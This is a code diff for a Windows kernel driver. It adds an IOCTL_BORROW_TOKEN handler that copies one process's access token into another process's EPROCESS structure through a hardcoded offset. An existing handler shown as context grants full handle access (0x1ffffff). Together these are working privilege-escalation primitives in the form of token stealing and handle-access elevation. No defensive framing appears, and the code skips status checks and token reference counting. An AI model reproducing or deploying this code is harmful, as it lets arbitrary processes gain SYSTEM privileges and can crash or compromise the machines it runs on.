@@ -391,6 +391,33 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 		DWORD64* GrantedAccessBits = (DWORD64*)((UCHAR *)HandleEntryAddress + 0x08);
 		*GrantedAccessBits = 0x1ffffff;
 		DbgPrint("GrantedAccessBits: 0x%x\n", *GrantedAccessBits);
+		
+		ObDereferenceObject(eProcess);
+		break;
+	}
+	case IOCTL_BORROW_TOKEN:
+	{
+		PTOKENX tokens = (PTOKENX)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+		PEPROCESS bEProcess;
+		PEPROCESS lEProcess;
+		status = PsLookupProcessByProcessId((HANDLE)tokens->borrowerPID, &bEProcess);
+		status = PsLookupProcessByProcessId((HANDLE)tokens->lenderPID, &lEProcess);
+
+		//TODO: obtain offsets in generic way
+		DWORD64* bToken = (DWORD64*)((UCHAR*)bEProcess + 0x248); //Token offset for Build 10.0.26200
+		DWORD64* lToken = (DWORD64*)((UCHAR*)lEProcess + 0x248); //Token offset for Build 10.0.26200
+
+		DbgPrint("btoken value: 0x%p\n", *bToken);
+		DbgPrint("ltoken value: 0x%p\n", *lToken);
+
+		DWORD64 lTokenNoRefCount = *lToken & ~0xf;
+
+		DbgPrint("lTokenNoRefCount: 0x%p\n", lTokenNoRefCount);
+
+		*bToken = lTokenNoRefCount;
+
+		ObDereferenceObject(bEProcess);
+		ObDereferenceObject(lEProcess);
 
 		break;
 	}
